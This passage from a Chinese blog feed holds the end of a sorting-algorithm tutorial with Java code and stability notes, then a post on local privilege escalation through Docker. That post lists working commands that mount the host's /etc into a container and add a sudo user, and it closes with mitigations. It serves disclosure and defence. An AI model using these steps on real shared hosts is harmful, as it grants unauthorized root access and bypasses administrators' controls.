class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[i]&gt;array[j])&#123;</span><br><span class="line">                tmp[k++]=array[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tmp[k++]=array[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//左序列未遍历完，依次填充到新序列末尾</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)&#123;</span><br><span class="line">        tmp[k++]=array[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//右序列未遍历完，依次填充到新序列末尾</span></span><br><span class="line">    <span class="keyword">while</span>(j&lt;=r)&#123;</span><br><span class="line">        tmp[k++]=array[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    k=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//新序列拷贝回原始序列</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">        array[l++]=tmp[k++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析-3"><a href="#1-4-算法复杂度分析-3" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　n个元素都要被遍历一遍以保证其被放到新数组, 需要将待排序序列中的所有记录扫描一遍，所以O(n)。 由完全二叉树可知，整个归并排序需要 ㏒₂n次， 所以 最好=最坏=平均=O(n㏒₂n)。 由于归并排序需要与原始记录序列同样数量的存储空间存放归并结果以及递归时㏒₂n的栈空间， 所以空间复杂度O(n+㏒₂n)。</p><p>　　归并排序是稳定排序，它也是一种十分高效的排序，能利用完全二叉树特性的排序一般性能都不会太差。java中Arrays.sort()采用了一种名为TimSort的排序算法，就是归并排序的优化版本。从上文的图中可看出，每次合并操作的平均时间复杂度为O(n)，而完全二叉树的深度为|㏒₂n|。总的平均时间复杂度为O(n㏒₂n)。而且，归并排序的最好，最坏，平均时间复杂度均为O(n㏒₂n)。</p><h2 id="7-快速排序"><a href="#7-快速排序" class="headerlink" title="7 快速排序"></a>7 快速排序</h2><blockquote><p>　　快速排序由C. A. R. Hoare在1962年提出。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列</p></blockquote><h3 id="1-1-算法描述-6"><a href="#1-1-算法描述-6" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><ul><li><strong>三数取中</strong></li></ul><p>　　在快排的过程中，每一次我们要取一个元素作为枢纽值，以这个数字来将序列划分为两部分。在此我们采用三数取中法，也就是取左端、中间、右端三个数，然后进行排序，将中间数作为枢纽值。<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/quicksort1.png" alt="快速排序示意图1"></p><ul><li><strong>根据枢纽值进行分割</strong><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/quicksort2.png" alt="快速排序示意图2"><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/quicksort3.png" alt="快速排序示意图3"></li></ul><h3 id="1-2-动图演示-5"><a href="#1-2-动图演示-5" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/quicksort1.gif" alt="快速排序演示图1"><br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/quicksort2.gif" alt="快速排序演示图2"></p><h3 id="1-3-代码实现-6"><a href="#1-3-代码实现-6" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 快速排序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=array.length;</span><br><span class="line">    QuickSort(array,<span class="number">0</span>,len-<span class="number">1</span>,asc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 快速排序——递归函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> l     左</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> r     右</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> j=QuickSortPartion(array,l,r,asc);</span><br><span class="line">    QuickSort(array,l,j-<span class="number">1</span>,asc);</span><br><span class="line">    QuickSort(array,j+<span class="number">1</span>,r,asc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 快速排序——分区操作</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 待排序的数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> l     左</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> r     右</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> asc   是否为升序排序模式 true:升序 false:降序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">QuickSortPartion</span><span class="params">(<span class="keyword">int</span>[] array,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">boolean</span> asc)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=l,j=r+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp=array[l];</span><br><span class="line">    <span class="keyword">if</span>(asc)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(array[++i]&lt;tmp)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==r)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(tmp&lt;array[--j])&#123;</span><br><span class="line">                <span class="keyword">if</span>(j==l)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;=j)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Swap(array,i,j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(array[++i]&gt;tmp)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==r)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(tmp&gt;array[--j])&#123;</span><br><span class="line">                <span class="keyword">if</span>(j==l)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;=j)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Swap(array,i,j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Swap(array,l,j);</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析-4"><a href="#1-4-算法复杂度分析-4" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　快速排序是一种交换类的排序，它同样是分治法的经典体现。在一趟排序中将待排序的序列分割成两组，其中一部分记录的关键字均小于另一部分。然后分别对这两组继续进行排序，以使整个序列有序。在分割的过程中，枢纽值的选择至关重要，本文采取了<strong>三位取中法</strong>，可以很大程度上避免分组”一边倒”的情况。快速排序平均时间复杂度也为O(n㏒₂n)级。</p><h1 id="三、其他排序算法"><a href="#三、其他排序算法" class="headerlink" title="三、其他排序算法"></a>三、其他排序算法</h1><h2 id="1-计数排序（Counting-Sort）"><a href="#1-计数排序（Counting-Sort）" class="headerlink" title="1 计数排序（Counting Sort）"></a>1 计数排序（Counting Sort）</h2><p>　　计数排序不是基于比较的排序算法，其核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。 作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><h3 id="1-1-算法描述-7"><a href="#1-1-算法描述-7" class="headerlink" title="1.1  算法描述"></a>1.1  算法描述</h3><ul><li>找出待排序的数组中最大和最小的元素；</li><li>统计数组中每个值为i的元素出现的次数，存入数组C的第i项；</li><li>对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）；</li><li>反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1。</li></ul><h3 id="1-2-动图演示-6"><a href="#1-2-动图演示-6" class="headerlink" title="1.2 动图演示"></a>1.2 动图演示</h3><p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/coutingsort1.gif" alt="计数排序演示图1"></p><h3 id="1-3-代码实现-7"><a href="#1-3-代码实现-7" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(略)</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析-5"><a href="#1-4-算法复杂度分析-5" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　计数排序是一个稳定的排序算法。当输入的元素是 n 个 0到 k 之间的整数时，时间复杂度是O(n+k)，空间复杂度也是O(n+k)，其排序速度快于任何比较排序算法。当k不是很大并且序列比较集中时，计数排序是一个很有效的排序算法。　　</p><h2 id="2-桶排序"><a href="#2-桶排序" class="headerlink" title="2 桶排序"></a>2 桶排序</h2><p>　　桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。桶排序 (Bucket sort)的工作的原理：假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排）。</p><h3 id="1-1-算法描述-8"><a href="#1-1-算法描述-8" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><ul><li>设置一个定量的数组当作空桶；</li><li>遍历输入数据，并且把数据一个一个放到对应的桶里去；</li><li>对每个不是空的桶进行排序；</li><li>从不是空的桶里把排好序的数据拼接起来。 　　<h3 id="1-2-图片演示"><a href="#1-2-图片演示" class="headerlink" title="1.2 图片演示　　"></a>1.2 图片演示　　</h3></li></ul><h3 id="1-3-代码实现-8"><a href="#1-3-代码实现-8" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(略)</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析-6"><a href="#1-4-算法复杂度分析-6" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　桶排序最好情况下使用线性时间O(n)，桶排序的时间复杂度，取决与对各个桶之间数据进行排序的时间复杂度，因为其它部分的时间复杂度都为O(n)。很显然，桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少。但相应的空间消耗就会增大。 </p><h2 id="3-基数排序"><a href="#3-基数排序" class="headerlink" title="3 基数排序"></a>3 基数排序</h2><p>　　基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。</p><h3 id="1-1-算法描述-9"><a href="#1-1-算法描述-9" class="headerlink" title="1.1 算法描述"></a>1.1 算法描述</h3><ul><li>取得数组中的最大数，并取得位数；</li><li>arr为原始数组，从最低位开始取每个位组成radix数组；</li><li>对radix进行计数排序（利用计数排序适用于小范围数的特点）；　　<h3 id="1-2-动图演示-7"><a href="#1-2-动图演示-7" class="headerlink" title="1.2 动图演示　　"></a>1.2 动图演示　　</h3><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/sort/radixsort1.gif" alt="基数排序演示图1"></li></ul><h3 id="1-3-代码实现-9"><a href="#1-3-代码实现-9" class="headerlink" title="1.3 代码实现"></a>1.3 代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(略)</span><br></pre></td></tr></table></figure><h3 id="1-4-算法复杂度分析-7"><a href="#1-4-算法复杂度分析-7" class="headerlink" title="1.4 算法复杂度分析"></a>1.4 算法复杂度分析</h3><p>　　基数排序基于分别排序，分别收集，所以是稳定的。但基数排序的性能比桶排序要略差，每一次关键字的桶分配都需要O(n)的时间复杂度，而且分配之后得到新的关键字序列又需要O(n)的时间复杂度。假如待排数据可以分为d个关键字，则基数排序的时间复杂度将是O(d*2n) ，当然d要远远小于n，因此基本上还是线性级别的。</p><p>　　基数排序的空间复杂度为O(n+k)，其中k为桶的数量。一般来说n&gt;&gt;k，因此额外空间需要大概n个左右。 　　</p><h1 id="四、稳定排序和不稳定排序"><a href="#四、稳定排序和不稳定排序" class="headerlink" title="四、稳定排序和不稳定排序"></a>四、稳定排序和不稳定排序</h1><p>　　排序算法的稳定性大家应该都知道，通俗地讲就是能保证排序前2个相等的数其在序列的前后位置顺序和排序后它们两个的前后位置顺序相同。在简单形式化一下，如果Ai = Aj，Ai原来在位置前，排序后Ai还是要在Aj位置前。</p><p>　　其次，说一下稳定性的好处。排序算法如果是稳定的，那么从一个键上排序，然后再从另一个键上排序，第一个键排序的结果可以为第二个键排序所用。基数排序就是这样，先按低位排序，逐次按高位排序，低位相同的元素其顺序再高位也相同时是不会改变的。另外，如果排序算法稳定，对基于比较的排序算法而言，元素交换的次数可能会少一些（个人感觉，没有证实）。</p><p>　　回到主题，现在分析一下常见的排序算法的稳定性，每个都给出简单的理由。</p><h2 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="(1)冒泡排序"></a>(1)冒泡排序</h2><p>　　冒泡排序就是把小的元素往前调或者把大的元素往后调。比较是相邻的两个元素比较，交换也发生在这两个元素之间。所以，如果两个元素相等，我想你是不会再无聊地把他们俩交换一下的；如果两个相等的元素没有相邻，那么即使通过前面的两两交换把两个相邻起来，这时候也不会交换，所以相同元素的前后顺序并没有改变，所以冒泡排序是一种稳定排序算法。</p><h2 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="(2)选择排序"></a>(2)选择排序</h2><p>　　选择排序是给每个位置选择当前元素最小的，比如给第一个位置选择最小的，在剩余元素里面给第二个元素选择第二小的，依次类推，直到第n - 1个元素，第n个元素不用选择了，因为只剩下它一个最大的元素了。那么，在一趟选择，如果当前元素比一个元素小，而该小的元素又出现在一个和当前元素相等的元素后面，那么交换后稳定性就被破坏了。比较拗口，举个例子，序列5 8 5 2 9，我们知道第一遍选择第1个元素5会和2交换，那么原序列中2个5的相对前后顺序就被破坏了，所以选择排序不是一个稳定的排序算法。</p><h2 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="(3)插入排序"></a>(3)插入排序</h2><p>　　插入排序是在一个已经有序的小序列的基础上，一次插入一个元素。当然，刚开始这个有序的小序列只有1个元素，就是第一个元素。比较是从有序序列的末尾开始，也就是想要插入的元素和已经有序的最大者开始比起，如果比它大则直接插入在其后面，否则一直往前找直到找到它该插入的位置。如果碰见一个和插入元素相等的，那么插入元素把想插入的元素放在相等元素的后面。所以，相等元素的前后顺序没有改变，从原无序序列出去的顺序就是排好序后的顺序，所以插入排序是稳定的。</p><h2 id="4-快速排序"><a href="#4-快速排序" class="headerlink" title="(4)快速排序"></a>(4)快速排序</h2><p>　　快速排序有两个方向，左边的i下标一直往右走，当a[i] &lt;= a[center_index]，其中center_index是中枢元素的数组下标，一般取为数组第0个元素。而右边的j下标一直往左走，当a[j] &gt; a[center_index]。如果i和j都走不动了，i &lt;= j，交换a[i]和a[j],重复上面的过程，直到i &gt; j。 交换a[j]和a[center_index]，完成一趟快速排序。在中枢元素和a[j]交换的时候，很有可能把前面的元素的稳定性打乱，比如序列为5 3 3 4 3 8 9 10 11，现在中枢元素5和3（第5个元素，下标从1开始计）交换就会把元素3的稳定性打乱，所以快速排序是一个不稳定的排序算法，不稳定发生在中枢元素和a[j] 交换的时刻。</p><h2 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="(5)归并排序"></a>(5)归并排序</h2><p>　　归并排序是把序列递归地分成短序列，递归出口是短序列只有1个元素（认为直接有序）或者2个序列（1次比较和交换），然后把各个有序的段序列合并成一个有序的长序列，不断合并直到原序列全部排好序。可以发现，在1个或2个元素时，1个元素不会交换，2个元素如果大小相等也没有人故意交换，这不会破坏稳定性。那么，在短的有序序列合并的过程中，稳定是是否受到破坏？没有，合并过程中我们可以保证如果两个当前元素相等时，我们把处在前面的序列的元素保存在结果序列的前面，这样就保证了稳定性。所以，归并排序也是稳定的排序算法。</p><h2 id="6-基数排序"><a href="#6-基数排序" class="headerlink" title="(6)基数排序"></a>(6)基数排序</h2><p>　　基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序，最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以其是稳定的排序算法。</p><h2 id="7-希尔排序-shell"><a href="#7-希尔排序-shell" class="headerlink" title="(7)希尔排序(shell)"></a>(7)希尔排序(shell)</h2><p>　　希尔排序是按照不同步长对元素进行插入排序，当刚开始元素很无序的时候，步长最大，所以插入排序的元素个数很少，速度很快；当元素基本有序了，步长很小， 插入排序对于有序的序列效率很高。所以，希尔排序的时间复杂度会比O(n^2)好一些。由于多次插入排序，我们知道一次插入排序是稳定的，不会改变相同元素的相对顺序，但在不同的插入排序过程中，相同的元素可能在各自的插入排序中移动，最后其稳定性就会被打乱，所以shell排序是不稳定的。</p><h2 id="8-堆排序"><a href="#8-堆排序" class="headerlink" title="(8)堆排序"></a>(8)堆排序</h2><p>　　我们知道堆的结构是节点i的孩子为2 * i和2 * i + 1节点，大顶堆要求父节点大于等于其2个子节点，小顶堆要求父节点小于等于其2个子节点。在一个长为n 的序列，堆排序的过程是从第n / 2开始和其子节点共3个值选择最大（大顶堆）或者最小（小顶堆），这3个元素之间的选择当然不会破坏稳定性。但当为n / 2 - 1， n / 2 - 2， … 1这些个父节点选择元素时，就会破坏稳定性。有可能第n / 2个父节点交换把后面一个元素交换过去了，而第n / 2 - 1个父节点把后面一个相同的元素没 有交换，那么这2个相同的元素之间的稳定性就被破坏了。所以，堆排序不是稳定的排序算法。</p><p>　　综上，得出结论: <strong>选择排序、快速排序、希尔排序、堆排序不是稳定的排序算法</strong>，而<strong>冒泡排序、插入排序、归并排序是稳定的排序算法</strong>。</p><h1 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h1><p><a href="https://www.cnblogs.com/alsf/p/6606287.html" target="_blank" rel="noopener">常见排序算法总结与实现(冒泡、插入、选择、希尔、堆排序、归并、快排):https://www.cnblogs.com/alsf/p/6606287.html</a></p><p><a href="https://www.cnblogs.com/onepixel/articles/7674659.html" target="_blank" rel="noopener">十大经典排序算法（动图演示）:https://www.cnblogs.com/onepixel/articles/7674659.html</a></p><p><a href="http://www.cnblogs.com/chengxiao/p/6103002.html" target="_blank" rel="noopener">图解排序算法(一)之3种简单排序(选择，冒泡，直接插入)<br>:http://www.cnblogs.com/chengxiao/p/6103002.html</a></p><p><a href="http://www.cnblogs.com/chengxiao/p/6129630.html" target="_blank" rel="noopener">图解排序算法(三)之堆排序:http://www.cnblogs.com/chengxiao/p/6129630.html</a></p><p><a href="https://www.cnblogs.com/chengxiao/p/6194356.html" target="_blank" rel="noopener">图解排序算法(四)之归并排序:https://www.cnblogs.com/chengxiao/p/6194356.html</a></p><p><a href="http://www.cnblogs.com/chengxiao/p/6262208.html" target="_blank" rel="noopener">图解排序算法(五)之快速排序——三数取中法:http://www.cnblogs.com/chengxiao/p/6262208.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文集中汇总&lt;code&gt;冒泡&lt;/code&gt;、&lt;code&gt;插入(对半插入)&lt;/code&gt;、&lt;code&gt;选择&lt;/code&gt;、&lt;code&gt;希尔&lt;/code&gt;、&lt;code&gt;堆排序&lt;/code&gt;、&lt;code&gt;归并&lt;/code&gt;、&lt;code&gt;快速&lt;/code&gt;、&lt;code&gt;七种排序算法&lt;/code&gt;，收集了网上的示意图、动图进行生动的展示。&lt;/p&gt;
    
    </summary>
    
    
      <category term="sort algorithm" scheme="http://blog.lxzh.app/tags/sort-algorithm/"/>
    
  </entry>
  
  <entry>
    <title>普通用户借助docker容器提权</title>
    <link href="http://blog.lxzh.app/2018/04/18/Privilge-Escalation-By-Docker/"/>
    <id>http://blog.lxzh.app/2018/04/18/Privilge-Escalation-By-Docker/</id>
    <published>2018-04-17T16:25:09.000Z</published>
    <updated>2019-11-06T18:21:07.829Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>阅读本文需要对docker有一定的了解，以及会一些基本的使用。</p></blockquote><p>随着docker越来越流行，很多公司内部linux机器上docker成了标配。</p><h2 id="免sudo使用docker"><a href="#免sudo使用docker" class="headerlink" title="免sudo使用docker"></a>免sudo使用docker</h2><p>默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限，如何保证普通用户也能顺利使用Docker呢？</p><p>这一点想必难不到大家，只需要管理员将需要使用docker的用户<code>添加到docker用户组</code>(安装docker后默认会创建该组)中，用户重新登录机器即可<code>免sudo</code>使用docker了。</p><a id="more"></a><h2 id="docker容器内用户权限不受限"><a href="#docker容器内用户权限不受限" class="headerlink" title="docker容器内用户权限不受限"></a>docker容器内用户权限不受限</h2><p>我们知道，用户创建一个docker容器后，大多情况下容器内默认是root用户，在不需要加sudo的情况下可以任意更改容器内的配置。</p><p>正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作以满足个性化使用。</p><h2 id="docker文件映射方便容器内外文件共享"><a href="#docker文件映射方便容器内外文件共享" class="headerlink" title="docker文件映射方便容器内外文件共享"></a>docker文件映射方便容器内外文件共享</h2><p>在我们创建容器的时候，docker提供了一个<code>-v</code>选项，用于用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。</p><p>然而便利倒是有了，但潜在了风险也是随之而来。</p><p>结合上面的两点便利，笔者想到一种普通用户借助docker突破host上权限的限制，达到本地提权的目的。参见下图：</p><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1523982357631.png" width="574"><h2 id="提权解读"><a href="#提权解读" class="headerlink" title="提权解读"></a>提权解读</h2><p>初始情况下这里host上的<code>test</code>用户是非sudo组用户，只拥有普通权限。为了<strong>免sudo</strong>使用docker，已提前通过管理员将test用户加入docker用户组(见<code>id</code>命令结果)。</p><p>首先我们借助任意一个docker镜像创建一个容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm xxx /bin/bash#常规使用</span><br><span class="line">docker run -it --rm -v /etc:/etc xxx /bin/bash#异常使用</span><br></pre></td></tr></table></figure><p>一般情况下我们如果不需要与host上进行文件共享，就可以不用加<code>-v</code>参数进行文件或目录映射，或者极大多数场景下加个人工作目录映射进容器内，便于容器内操作host上的文件，或者拷贝文件到host。</p><p>为了达到提权的目的，这里最关键的一点就是<code>-v</code>选项的参数<code>/etc:/etc</code>。</p><p>我们知道linux机器上的本地用户信息主要记录在<code>/etc/</code>目录下，比如常见文件<code>/etc/passwd</code>、<code>/etc/shadow</code>和<code>/etc/group</code>，这几个文件分别记录了用户基本属性、用户密码与用户分组信息。</p><p>正常情况下创建的容器，内部也会有/etc目录，容器内部的用户信息也是记录在该目录。</p><p>然而我这里巧妙的将host上的/etc目录直接映射进容器，从而覆盖了容器内的/etc目录。再加上容器内用户默认是root，拥有超级管理员权限，如上图中，通过容器内的root用户在容器内新加了一个用户test1:<code>adduser test1</code>，并赋予该用户sudo权限:<code>usermod -aG sudo test1</code>。</p><p>至此，为了提权docker容器的作用已结束，Ctrl+D退出容器回到host，通过<code>cat /etc/passwd</code>查看一下本地用户基本属性，想必大家也能猜出这么做会出现什么有趣的现象。图中我没有查看，而是直接<code>su test1</code>，顺利切换到在容器内添加的用户，也就是说在容器内添加的用户实际上也添加到了host上。通过<code>id</code>命令查看该用户也被同步加入到了sudo用户组。</p><p>其实到了这一步已经达到了提权的目的，即通过“普通的test”用户借助docker容器成功创建了一个具有sudo权限的用户test1。图中只是增加了一步，借助test1将test也加入sudo用户组，其实效果一样。</p><p>当然这里为了简化操作也可以不用增加test1用户，直接在容器内将test用户加入sudo用户组，因为此时test用户对于容器也是可见，也是可以直接操作其所属群组，如下图所示：<br><img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1525446808925.png" width="753"><br>最后在host上也可以看到test用户已经被加入sudo用户组了。此时我没有用id命令查看的一个原因是，linux的shell并没有自动更新当前用户信息，可以退出Terminal重新进入。</p><pre><code>注：此时如果没有重新连接，test用户还是无法使用sudo命令。</code></pre><h2 id="问题影响"><a href="#问题影响" class="headerlink" title="问题影响"></a>问题影响</h2><p>在这种多用户借助docker共用一台机器的情况下，“普通用户”可以轻松的借助docker提升为sudo用户，从而可以进行任意修改系统配置等各种恶意操作。</p><p>以上这种情形本地用户的破坏还不是很明显，毕竟是公司内部用户大多不会进行恶意操作。然而，很多情况下普通用户为了方便，用户密码往往设置得很简单，如果攻击者通过其他途径进入内网并暴力破解普通用户的弱口令，就可以很轻松的提升为管理员从事不可限制的恶意操作，这也大大降低了攻击者的攻击难度。</p><h2 id="规避措施"><a href="#规避措施" class="headerlink" title="规避措施"></a>规避措施</h2><p>docker创建容器默认是以root身份来创建的，普通用户之所以能够创建容器的原因就是这个docker用户组，所以我们应该规避使用这种做法。对于多个用户想使用容器，可以通过管理员集中创建开启了ssh服务的容器，并提供端口映射到host上，让普通用户通过ssh登录指定端口进入容器，这样就可以限制普通用户的活动范围在容器内，用户的任意操作也不会扩散到host上，从而保障host机器的安全。</p><p>当然对于突破docker容器的攻击得另当别论，以其他方式来防御。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;阅读本文需要对docker有一定的了解，以及会一些基本的使用。&lt;/p&gt;
&lt;/blockquote&gt;
